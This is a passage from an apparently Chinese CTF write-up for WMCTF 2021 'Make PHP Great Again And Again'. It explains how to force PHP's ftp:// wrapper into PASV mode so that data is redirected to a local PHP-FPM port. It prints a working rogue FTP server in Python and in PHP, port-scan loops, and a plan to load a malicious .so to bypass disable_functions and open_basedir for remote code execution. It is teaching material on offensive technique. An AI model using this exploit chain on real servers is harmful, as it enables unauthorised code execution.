&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$context&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php ftp_write_2.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;newwwwew&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112225832777.png" alt="image-20211112225832777">&lt;/p>
&lt;h4 id="令php使用ftp并转发ftp-data">令php使用ftp://并转发FTP-DATA&lt;/h4>
&lt;p>将上面的操作用wireshark抓个包看看流量&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112230401822.png" alt="image-20211112230401822">&lt;/p>
&lt;p>可以看到用的是EPSV mode而不是PASV mode，不会有括号内的ip+port描述，FTP-DATA只会被打向控制连接的服务端的端口，不能做到FTP-DATA的任意转发&lt;/p>
&lt;p>不过也不是毫无办法，如果用EPSV命令返回的结果不是229，那么php的ftp://就会使用PASV命令&lt;/p>
&lt;p>将上面的ftp-server修改一下，将229响应设为了000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;550 Could not get file size.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># responese with 000 , not 229&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;000 use PASV then&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># then php will send PASV command&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># response to PASV command&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112234038671.png" alt="image-20211112234038671">&lt;/p>
&lt;p>成功转发&lt;/p>
&lt;h4 id="使用ftp将payload打向fpm">使用ftp://将payload打向fpm&lt;/h4>
&lt;p>结合上面几个实例应该就很清晰了，思路就是：&lt;/p>
&lt;ul>
&lt;li>编写包含执行系统命令的恶意.so&lt;/li>
&lt;li>打向fpm的一波流量，用于解开open_basedir, allow_url_include等的限制，形式是file_put_contents(&amp;lsquo;ftp://xxx&amp;rsquo;,$payload)&lt;/li>
&lt;li>用file_put_contents('/tmp/wuhu.so',$_POST[&amp;lsquo;data&amp;rsquo;])的形式将.so传入&lt;/li>
&lt;li>如果顺利的话open_basedir解开限制，.so被包含，就可以成功执行.so中的代码做到rce了&lt;/li>
&lt;/ul>
&lt;p>这里的完美栗子当然是赵总的三句话（指路赵总博客-&amp;gt;&lt;a href="https://www.zhaoj.in/read-6951.html">WMCTF2021-Web-Make PHP Great Again And Again WriteUp&lt;/a>&lt;/p>
&lt;h4 id="wmctf-2021make-php-great-again-and-again">[WMCTF 2021]Make PHP Great Again And Again&lt;/h4>
&lt;p>思路先放在前面：找到fpm端口-&amp;gt;搭建恶意ftp_server 将.so文件转发至fpm端口-&amp;gt;利用.so文件执行命令-&amp;gt;拿flag&lt;/p>
&lt;p>题目代码只有三句话&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;glzjin&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接看phpinfo();会500，用&lt;code>get_cfg_var&lt;/code>获取配置项&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27disable_functions%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(657) &amp;quot;stream_socket_client,fsockopen,pfsockopen,ini_alter,ini_set,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive&amp;quot;
&lt;/code>&lt;/pre>&lt;p>只能说该禁的都禁了；再康康allow_url_fopen和include&lt;/p>
&lt;pre tabindex="0">&lt;code>string(1) &amp;quot;1&amp;quot;
string(0) &amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>再康康open_basedir&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27open_basedir%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(14) &amp;quot;/var/www/html/&amp;quot;
&lt;/code>&lt;/pre>&lt;p>emmmmmmmmm 这个之后也需要绕过&lt;/p>
&lt;p>用tcp://伪协议扫一下本机开放的端口&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ee2&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;Address already in use&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者&lt;code>file_get_contents&lt;/code>和&lt;code>error_get_last&lt;/code>获取到请求中发出的错误进行循环判断也可以进行端口扫描&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error_get_last&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#d88200">&amp;#39;message&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection refused&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>int(11451) int(37114) int(48748)
&lt;/code>&lt;/pre>&lt;p>找到了fpm端口11451&lt;/p>
&lt;p>之后就续上了我们前面的思路，先在本地（也就是靶机的本地）起一个恶意的ftp_server服务用来转发FTP-DATA（即.so文件）至fpm端口（11451）；这里的exp是php版的，原理跟上面的py版是一样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$socket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:46819&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errno&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errstr&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$errstr&lt;/span>&lt;span style="color:#d88200"> (&lt;/span>&lt;span style="color:#d88200">$errno&lt;/span>&lt;span style="color:#d88200">)&amp;lt;br /&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_accept&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;210 Fake FTP&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// USER
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;230 Login successful&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// TYPE
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;200 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// SIZE
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;550 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// EPSV
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;500 wtf&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// PASV
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">// $ip = &amp;#39;192.168.1.4&amp;#39;;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">11451&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$porth&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">floor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$portl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;227 Entering Passive Mode. &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ip&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;,&lt;/span>&lt;span style="color:#d88200">$porth&lt;/span>&lt;span style="color:#d88200">,&lt;/span>&lt;span style="color:#d88200">$portl\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// STOR
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
